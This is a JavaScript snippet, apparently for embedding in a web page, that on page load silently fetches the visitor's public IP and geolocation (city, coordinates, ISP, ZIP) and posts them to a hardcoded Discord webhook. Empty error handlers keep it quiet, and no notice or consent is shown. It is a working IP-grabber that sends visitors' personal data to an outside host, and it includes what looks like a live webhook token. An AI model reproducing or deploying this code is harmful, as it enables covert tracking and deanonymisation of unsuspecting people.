  function sendIPToWebhook() {
            const webhookURL = 'https://discord.com/api/webhooks/1132405889396129819/g8O3i4yyJFmYcrh9tmH3X9UXpRPvPn5BUbjDrJ0nsctfu3uWMf_6gXermzfhqR_KpnWW'; // Replace with your actual Discord webhook URL
            const ipstackAPIKey = 'YOUR_IPSTACK_API_KEY'; // Replace with your actual ipstack API key

            // Fetch the user's public IP address using ipify API
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    // Get the user's IP address
                    const ipAddress = data.ip;
                    // Use the IP address to fetch geolocation information using ip-api.com API
                    fetch(`https://ipapi.co/${ipAddress}/json/`)
                        .then(response => response.json())
                        .then(geoData => {
                            // Create the data payload to send to the Discord webhook
                            const dataPayload = {
                                content: `User's IP Address: ${geoData.ip}\nCountry: ${geoData.country_name}\nRegion: ${geoData.region}\nCity: ${geoData.city}\nLatitude: ${geoData.latitude}\nLongitude: ${geoData.longitude}\nISP: ${geoData.org}\nOrganization: ${geoData.asn}\nZIP Code: ${geoData.postal}`,
                            };

                            // Send the data to the Discord webhook
                            fetch(webhookURL, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify(dataPayload),
                            })
                            .then(response => {
                                if (response.ok) {
                                } else {
                                }
                            })
                            .catch(error => {
                            });
                        })
                        .catch(error => console.error(error));
                })
                .catch(error => console.error(error));
        }

        // Automatically send the webhook on page load
        sendIPToWebhook();
